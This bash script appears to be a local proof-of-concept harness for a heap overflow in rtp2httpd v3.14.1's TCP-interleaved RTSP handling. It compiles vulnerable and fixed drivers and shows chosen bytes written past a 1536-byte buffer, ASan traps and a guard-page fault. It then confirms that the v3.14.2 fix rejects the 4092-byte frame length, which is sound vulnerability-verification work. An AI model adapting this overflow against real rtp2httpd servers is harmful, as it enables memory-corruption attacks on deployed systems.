#!/usr/bin/env bash
# Source-bound rtp2httpd TCP-interleaved overflow harness.
# All inputs are local argv values standing in for an RTSP interleaved frame;
# no rtp2httpd daemon, socket or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
    else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    case "$t" in
        vuln) gcc -O0 -g -o "$OUT/vuln" driver_vuln.c ;;
        fixed) gcc -O0 -g -o "$OUT/fixed" driver_fixed.c ;;
        vuln_asan) gcc -O0 -g -fsanitize=address -o "$OUT/vuln_asan" driver_vuln.c ;;
        fixed_asan) gcc -O0 -g -fsanitize=address -o "$OUT/fixed_asan" driver_fixed.c ;;
    esac || exit 2
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"
HOSTILE=4092  # RTSP_RESPONSE_BUFFER_SIZE - 4: accepted by the v3.14.1 guard
BENIGN=1536   # BUFFER_POOL_BUFFER_SIZE: the v3.14.2 guard ceiling

# Rung 1: the wire length passes the v3.14.1 guard and reaches memcpy unclamped.
r1=$($V collab $HOSTILE 65)
echo "$r1"
check "rung1 hostile frame length reaches copy" \
    "$(yes 'rv=1 plen=4092 dsize=4092' "$r1")"

# Rung 2: chosen frame bytes land 1600/2400/2500 bytes past the 1536-byte slot.
ok=0
contains 'oob1600=4142434441424344' "$r1" &&
contains 'oob2400=4142434441424344' "$r1" &&
contains 'oob2500=4142434441424344' "$r1" && ok=1
check "rung2 chosen bytes at three OOB offsets" "$ok"

# Rung 3: ASan traps the verbatim memcpy in the pinned v3.14.1 source.
"$VA" exact $HOSTILE 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 4092' "$ac" &&
contains 'rtsp_v3.14.1:1825' "$ac" &&
contains '1536-byte region' "$ac" && ok=1
check "rung3 ASan write at pinned v3.14.1:1825" "$ok"

# Rung 4: a different chosen seed reads back byte-exact in the OOB region.
r4=$($V collab $HOSTILE 90)
echo "$r4"
ok=0
contains 'oob1600=5a5b5c5d5a5b5c5d' "$r4" &&
contains 'oob2400=5a5b5c5d5a5b5c5d' "$r4" &&
contains 'oob2500=5a5b5c5d5a5b5c5d' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at three OOB offsets" "$ok"

# Guard page: the first past-end store crosses into PROT_NONE.
( "$V" guard $HOSTILE 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first past-end write" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed v3.14.2 bounds against the destination; benign traffic is unchanged.
fc=$($F collab $HOSTILE 65)
check "fixed rejects hostile frame length" "$(yes 'rv=0 reject plen=4092' "$fc")"
fg=$($F collab $BENIGN 65)
check "fixed accepts benign frame length" "$(yes 'rv=1 plen=1536 dsize=1536' "$fg")"

"$FA" exact $HOSTILE 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact $BENIGN 65 > "$OUT/fixed_asan_good.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgo=$(cat "$OUT/fixed_asan_good.log")
ok=0
! contains 'AddressSanitizer' "$fb" && ! contains 'AddressSanitizer' "$fgo" && ok=1
check "fixed ASan clean on hostile and benign" "$ok"
vgr=$($VA exact $BENIGN 65 2>&1)
ok=0
! contains 'AddressSanitizer' "$vgr" && contains 'rv=1' "$vgr" && ok=1
check "vulnerable ASan clean on benign frame" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    local h=""
    for i in 1 2 3 4 5; do
        h="$h$($V collab $HOSTILE 65)$($V guard $HOSTILE 65 2>/dev/null; echo "rc=$?")$($VA exact $HOSTILE 65 2>&1 | grep -oE 'WRITE of size [0-9]+|rtsp_v3\.14\.1:[0-9]+' | tr '\n' ',')"
    done
    printf '%s' "$h" | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
